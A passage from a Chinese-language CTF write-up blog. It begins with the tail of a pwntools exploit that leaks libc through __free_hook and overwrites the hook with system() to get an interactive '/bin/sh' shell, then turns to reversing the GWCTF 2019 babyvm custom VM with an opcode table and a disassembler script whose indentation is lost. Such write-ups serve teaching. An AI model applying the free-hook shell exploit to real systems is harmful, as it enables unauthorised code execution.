class="line">io.recvuntil(<span class="string">&#x27;SP: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">io.recvuntil(<span class="string">&#x27;SIZE: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(code)))</span><br><span class="line">io.recvuntil(<span class="string">&#x27;CODE: &#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> code:</span><br><span class="line">    <span class="comment">#sleep(0.2)</span></span><br><span class="line">    io.sendline(<span class="built_in">str</span>(i))</span><br><span class="line">io.recvuntil(<span class="string">&#x27;R3: &#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">last_4bytes = <span class="built_in">int</span>(io.recv(<span class="number">8</span>), <span class="number">16</span>)+<span class="number">8</span></span><br><span class="line">log.success(<span class="string">&#x27;last_4bytes =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(last_4bytes)))</span><br><span class="line">io.recvuntil(<span class="string">&#x27;R4: &#x27;</span>)</span><br><span class="line">first_4bytes = <span class="built_in">int</span>(io.recv(<span class="number">4</span>), <span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">&#x27;first_4bytes =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(first_4bytes)))</span><br><span class="line"></span><br><span class="line">free_hook = (first_4bytes &lt;&lt; <span class="number">32</span>)+last_4bytes</span><br><span class="line">libc_base = free_hook-libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system_addr = libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;free_hook =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(free_hook)))</span><br><span class="line">log.success(<span class="string">&#x27;system_addr =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(system_addr)))</span><br><span class="line"><span class="comment">#io.recvuntil(&#x27;OVM?n&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>+p64(system_addr))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>由于程序只有一次写入和free的机会,并且写入和free用的是同一个指针</p><p>因此部署binsh和覆写system要在一次完成</p><p>故选择comment写为__free_hook-8,这样先写binsh,再写system,之后又触发free(comment)实际上就已经变成了system(‘/bin/sh’)</p><h2 id="GWCTF-2019-babyvm"><a href="#GWCTF-2019-babyvm" class="headerlink" title="[GWCTF 2019]babyvm"></a>[GWCTF 2019]babyvm</h2><p>一道逆向VM题,头大</p><p>初始化操作,前四个模拟寄存器,unk_202060存存储指令码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">nsigned __int64 __fastcall <span class="title function_">initt</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  *(_DWORD *)a1 = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">4</span>) = <span class="number">18</span>;</span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">8</span>) = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">12</span>) = <span class="number">0</span>;</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">16</span>) = &amp;unk_202060;</span><br><span class="line">  *(_BYTE *)(a1 + <span class="number">24</span>) = <span class="number">0xF1</span>;</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">32</span>) = sub_B5F;</span><br><span class="line">  *(_BYTE *)(a1 + <span class="number">40</span>) = <span class="number">0xF2</span>;</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">48</span>) = sub_A64;</span><br><span class="line">  *(_BYTE *)(a1 + <span class="number">56</span>) = <span class="number">0xF5</span>;</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">64</span>) = sub_AC5;</span><br><span class="line">  *(_BYTE *)(a1 + <span class="number">72</span>) = <span class="number">0xF4</span>;</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">80</span>) = sub_956;</span><br><span class="line">  *(_BYTE *)(a1 + <span class="number">88</span>) = <span class="number">0xF7</span>;</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">96</span>) = sub_A08;</span><br><span class="line">  *(_BYTE *)(a1 + <span class="number">104</span>) = <span class="number">0xF8</span>;</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">112</span>) = sub_8F0;</span><br><span class="line">  *(_BYTE *)(a1 + <span class="number">120</span>) = <span class="number">0xF6</span>;</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">128</span>) = sub_99C;</span><br><span class="line">  qword_2022A8 = <span class="built_in">malloc</span>(<span class="number">0x512</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(qword_2022A8, <span class="number">0</span>, <span class="number">0x512</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>F1,F2等操作码各自对应着函数</p><div class="table-container"><table><thead><tr><th>0xF1</th><th>实现mov操作</th></tr></thead><tbody><tr><td>0xF2</td><td>寄存器1异或寄存器2</td></tr><tr><td>0xF5</td><td>读入并判断长度</td></tr><tr><td>0xF4</td><td>nop</td></tr><tr><td>0xF7</td><td>寄存器1乘寄存器4</td></tr><tr><td>0xF8</td><td>寄存器1交换寄存器2</td></tr><tr><td>0xF6</td><td>寄存器1=2<em>寄存器2+3\</em>寄存器3+寄存器1</td></tr></tbody></table></div><p>提取出0x202060处的指令后脚本处理一下</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">opcode=[<span class="number">0xF5</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, </span><br><span class="line">  <span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x21</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x02</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x23</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x24</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x25</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE1</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x26</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE4</span>, <span class="number">0x27</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x28</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, </span><br><span class="line">  <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x29</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, </span><br><span class="line">  <span class="number">0x2A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x2B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0C</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x2C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x2D</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x2E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0F</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x2F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE1</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x30</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE4</span>, <span class="number">0x31</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x12</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x32</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, </span><br><span class="line">  <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x33</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF4</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF5</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE1</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x02</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE4</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, </span><br><span class="line">  <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x05</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE2</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE3</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE5</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF6</span>, <span class="number">0xF7</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE4</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE3</span>, <span class="number">0x09</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE5</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF6</span>, </span><br><span class="line">  <span class="number">0xF7</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x08</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE3</span>, <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE5</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF6</span>, <span class="number">0xF7</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE1</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF8</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE7</span>, </span><br><span class="line">  <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x12</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF8</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x0E</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE7</span>, <span class="number">0x12</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE1</span>, <span class="number">0x0F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF8</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x0F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE7</span>, </span><br><span class="line">  <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF4</span>]</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(opcode)):</span><br><span class="line"><span class="keyword">if</span> (opcode[i] == <span class="number">0xF1</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;mov &#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> (opcode[i + <span class="number">1</span>] == <span class="number">0xE1</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;eax &#x27;</span> + <span class="string">&#x27;flag[&#x27;</span> + <span class="built_in">str</span>(opcode[i + <span class="number">2</span>]) + <span class="string">&#x27;]&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> (opcode[i + <span class="number">1</span>] == <span class="number">0xE2</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ebx &#x27;</span> + <span class="string">&#x27;flag[&#x27;</span> + <span class="built_in">str</span>(opcode[i + <span class="number">2</span>]) + <span class="string">&#x27;]&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> (opcode[i + <span class="number">1</span>] == <span class="number">0xE3</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ecx &#x27;</span> + <span class="string">&#x27;flag[&#x27;</span> + <span class="built_in">str</span>(opcode[i + <span class="number">2</span>]) + <span class="string">&#x27;]&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> (opcode[i + <span class="number">1</span>] == <span class="number">0xE4</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag[&#x27;</span> + <span class="built_in">str</span>(opcode[i + <span class="number">2</span>]) + <span class="string">&#x27;] &#x27;</span> + <span class="string">&#x27;eax&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> (opcode[i + <span class="number">1</span>] == <span class="number">0xE5</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;edx &#x27;</span> + <span class="string">&#x27;flag[&#x27;</span> + <span class="built_in">str</span>(opcode[i + <span class="number">2</span>]) + <span class="string">&#x27;]&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> (opcode[i + <span class="number">1</span>] == <span class="number">0xE7</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag[&#x27;</span> + <span class="built_in">str</span>(opcode[i + <span class="number">2</span>]) + <span class="string">&#x27;] &#x27;</span> + <span class="string">&#x27;ebx&#x27;</span>)</span><br><span class="line">i += <span class="number">6</span></span><br><span class="line"><span class="keyword">elif</span> (opcode[i] == <span class="number">0xF2</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;xor eax ebx&#x27;</span>)</span><br><span class="line">i += <span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> (opcode[i] == <span class="number">0xF5</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line">i += <span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> (opcode[i] == <span class="number">0xF4</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;nop&#x27;</span>)</span><br><span class="line">i += <span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> (opcode[i] == <span class="number">0xF7</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;mul eax edx&#x27;</span>)</span><br><span class="line">i += <span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> (opcode[i] == <span class="number">0xF8</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;swap eax ebx&#x27;</span>)</span><br><span class="line">i += <span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> (opcode[i] == <span class="number">0xF6</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;mov eax=3*eax+2*ebx+ecx&#x27;</span>)</span><br><span class="line">i += <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">i += <span class="number">1</span></span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 